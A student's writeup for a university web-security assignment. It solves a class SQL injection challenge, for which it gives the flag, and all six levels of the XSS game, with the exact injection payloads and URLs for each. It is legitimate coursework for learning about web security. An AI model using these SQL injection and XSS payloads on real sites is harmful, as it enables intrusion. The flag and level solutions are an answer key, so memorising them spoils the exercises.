# Writeup 1 - Web I

Name: Andrew Figlarz
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Andrew Figlarz


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

Such a Quick Little, website!

[http://142.93.136.81:5000/](http://142.93.136.81:5000/)


Part 1:

When you click on any of the item pages you can see there is a “id=0” tag at the end of the URL. I tried to exploit this by using the 1=1 SQL trick. So, what I did was replace this end of the URL with: id='||'1'='1. I then found the flag when I scrolled down the page. The whole web URL was: http://142.93.136.81:5000/item?id=%27||%271%27=%271 . I think that the %27 came from the single quotations being interpreted a special way.

Flag: CMSC389R-{y0u_ar3_th3_SQ1_ninj@}


### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

Produce a writeup. We will not take off points for viewing the source code and/or viewing hints, but we strongly discourage reading online write-ups as that defeats the purpose of the homework.

### Format

Part 1 and 2 can be answered in bullet form or full, grammatical sentences.


Level1: 
You can just pass in the normal script tags with alert() into the search box. 
<script>alert()</script>

Level2:
Since the script tags no longer work for this level, I tried to use a button instead to trigger the alert.
<button onclick="alert()">Click</button>

Level 3:
I noticed that you can trigger an error by replacing the frame with a string, so by adding the “onerror” option you can cause an alert to trigger. 
https://xss-game.appspot.com/level3/frame#1' onerror='alert()'

Level 4:
I noticed that you could do something like command injection by imputing the alert in the following format:
'); alert('

Level 5:
I just tried changing what was after the equals sign to an alert and it worked.
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert();

Level 6:
I was stuck on this one for a while. I figured out that you could have the website point to another website instead of a file on the local directory. I had to lookup how to get it to work though. This included putting the HTTPS in caps. I also created a pastebin that contained just the text: alert() so that the alert could trigger. 
https://xss-game.appspot.com/level6/frame#HTTPS://pastebin.com/raw/vcqzHGq2

### Scoring

* Part 1 is worth 40 points
* Part 2 is worth 60 points

### Tips

Remember to document your thought process for maximum credit!

Review the slides for help with using any of the tools or libraries discussed in
class.
